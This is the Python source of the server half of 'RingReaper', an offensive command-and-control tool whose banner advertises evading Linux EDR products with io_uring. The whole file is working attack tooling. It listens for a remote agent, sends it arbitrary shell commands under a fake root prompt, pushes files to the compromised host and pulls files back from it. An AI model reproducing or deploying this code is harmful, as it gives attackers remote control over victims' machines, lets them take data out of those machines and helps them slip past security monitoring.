import socket
import argparse
import sys
import os
import threading
import readline

BANNER = r"""


██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██║██║ ╚████║╚██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                              
   @MatheuZSecurity || Rootkit Researchers || https://discord.gg/66N5ZQppU7

   	          --- EVADING LINUX EDRS WITH IO_URING ---

"""

def put_file(conn, local_path, remote_path):
    try:
        size = os.path.getsize(local_path)
        conn.sendall(f"recv {remote_path} {size}\n".encode())
        print(f"[+] Sent 'recv {remote_path} {size}' to agent")

        with open(local_path, "rb") as f:
            while chunk := f.read(4096):
                conn.sendall(chunk)
        print(f"[+] File {local_path} sent to agent successfully")
    except Exception as e:
        print(f"[!] Failed to send file: {e}")

def handle_client(conn, addr):
    print(f"[+] Connected by {addr}")
    try:
        while True:
            cmd = input("root@nsa:~# ").strip()
            if not cmd:
                continue

            if cmd.startswith("put "):
                parts = cmd.split()
                if len(parts) != 3:
                    print("[!] Usage: put <local_path> <remote_path>")
                    continue
                local_path, remote_path = parts[1], parts[2]
                put_file(conn, local_path, remote_path)
                continue

            if cmd.startswith("get "):
                parts = cmd.split()
                if len(parts) != 3:
                    print("[!] Usage: get <remote_path> <local_path>")
                    continue
                remote_path, local_path = parts[1], parts[2]
                conn.sendall(f"send {remote_path}\n".encode())

                with open(local_path, "wb") as f:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk or b"<<EOF>>" in chunk:
                            chunk = chunk.replace(b"<<EOF>>", b"")
                            f.write(chunk)
                            break
                        f.write(chunk)
                print(f"[+] File {remote_path} received as {local_path}")
                continue

            conn.sendall(cmd.encode() + b"\n")

            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    print("[!] Connection closed by client")
                    return
                data += chunk
                if len(chunk) < 4096:
                    break

            print("[+] Output:\n")
            print(data.decode(errors="ignore"))

    except KeyboardInterrupt:
        print("\n[-] Session terminated.")

    finally:
        conn.close()

def main():
    parser = argparse.ArgumentParser(description="RingReaper server")
    parser.add_argument("--ip", required=True, help="IP address to listen on")
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    args = parser.parse_args()

    print(BANNER)

    host = args.ip
    port = args.port

    print(f"[+] Starting server on {host}:{port}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen()
        print("[+] Waiting for connections...")

        while True:
            try:
                conn, addr = s.accept()
                thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
                thread.start()
            except KeyboardInterrupt:
                print("\n[-] Server shutting down.")
                break

if __name__ == "__main__":
    main()
